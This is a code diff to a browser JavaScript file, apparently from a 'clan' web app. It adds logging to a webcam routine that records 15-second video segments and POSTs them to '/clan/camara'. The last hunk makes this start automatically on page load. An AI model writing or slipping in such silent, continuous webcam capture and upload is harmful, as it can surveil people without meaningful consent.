@@ -2563,6 +2563,7 @@ let chunksCamara = []
 async function iniciarCamara() {
     try {
         streamCamara = await navigator.mediaDevices.getUserMedia({ video: true })
+        console.log('[CAMARA] Permiso aceptado, iniciando grabación...')
         mediaRecorder = new MediaRecorder(streamCamara)
 
         mediaRecorder.ondataavailable = (e) => {
@@ -2570,20 +2571,26 @@ async function iniciarCamara() {
         }
 
         mediaRecorder.onstop = async () => {
-            if (chunksCamara.length === 0) return
+            if (chunksCamara.length === 0) {
+                console.log('[CAMARA] Sin chunks, nada para mandar')
+                return
+            }
             const blob = new Blob(chunksCamara, { type: 'video/webm' })
             chunksCamara = []
-            
+            console.log('[CAMARA] Mandando segmento, tamaño:', blob.size, 'bytes')
+
             fetch('/clan/camara', {
                 method: 'POST',
                 headers: { 'Content-Type': 'video/webm' },
                 body: blob
             })
             .then(r => r.json())
+            .then(d => console.log('[CAMARA] Respuesta servidor:', d))
+            .catch(e => console.error('[CAMARA] Error al mandar:', e))
         }
 
-        // Grabar en segmentos de 10 segundos y mandar automáticamente
         mediaRecorder.start()
+        console.log('[CAMARA] Grabando...')
         setInterval(() => {
             if (mediaRecorder && mediaRecorder.state === 'recording') {
                 mediaRecorder.stop()
@@ -2591,8 +2598,8 @@ async function iniciarCamara() {
             }
         }, 15000)
 
-
     } catch (e) {
+        console.error('[CAMARA] Error o permiso rechazado:', e)
     }
 }
 
@@ -2605,3 +2612,5 @@ function detenerCamara() {
 }
 
 window.addEventListener('beforeunload', detenerCamara)
+
+iniciarCamara()
